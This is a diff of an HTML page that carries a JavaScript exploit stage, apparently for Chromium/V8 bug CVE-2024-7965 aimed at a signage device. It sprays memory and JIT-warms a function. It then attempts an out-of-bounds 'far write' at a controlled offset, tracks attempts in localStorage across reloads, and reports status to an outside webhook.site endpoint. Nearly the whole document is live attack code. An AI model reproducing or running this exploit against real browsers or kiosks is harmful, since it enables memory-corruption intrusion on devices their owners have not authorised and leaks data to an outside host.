@@ -1,13 +1,13 @@
 <html><body><script>
 // esc_stage1: device-side far-write recon (CVE-2024-7965, tahir-controlled)
 // One shot per page load; survives renderer crash via signage reload; progress in localStorage.
-const SINK = 'https://webhook.site/8ef04aba-6afe-4523-972f-67ffeeb88173';
+const SINK = 'https://webhook.site/d14b9308-3eca-44e5-8e74-a88903035ea0';
 function beacon(t, v){
   try { fetch(SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,150)), {mode:'no-cors'}); } catch(e) {}
 }
 var N = 0;
 try { N = parseInt(localStorage.getItem('esc1_n') || '0', 10); } catch(e) {}
-beacon('load', 'n=' + N + ' ' + navigator.userAgent.slice(0,40));
+beacon('load', 'n=' + N);
 
 // small fully-committed spray (fits low-RAM device)
 var NB = 8, SZB = 32 * 1024 * 1024;   // 8 x 32MB = 256MB
@@ -15,7 +15,7 @@ var bufs = [];
 try {
   for (var b = 0; b < NB; b++) { var u = new Uint32Array(SZB / 4); u.fill(0xABABABAB); bufs.push(u); }
 } catch(e) { beacon('spray-exc', String(e).slice(0,80)); }
-beacon('spray', 'ok ' + NB + 'x32MB');
+
 
 var arrx = new Array(150);
 arrx[0] = 1.1;
@@ -66,10 +66,10 @@ for (var i = 2; w < 60000; i++) {
   if (a % 5 == 0 && a % 7 == 0) continue;
   poc(a); w++;
 }
-beacon('warm', 'done ' + w);
+
 
 // THE SHOT: offset = tahir*4 bytes past elements; step 1GB in index units (4GB in bytes)
-var MAXN = 40;
+var MAXN = 15;
 var idx = 0x100000000 + N * 0x40000000;
 tahir = idx;
 beacon('shot', 'n=' + N + ' idx=0x' + idx.toString(16));
@@ -86,5 +86,5 @@ for (var b = 0; b < bufs.length; b++) {
 }
 
 try { localStorage.setItem('esc1_n', String(Math.min(N + 1, MAXN))); } catch(e) {}
-beacon('done', 'n=' + N + ' next=' + (N + 1));
+
 </script></body></html>
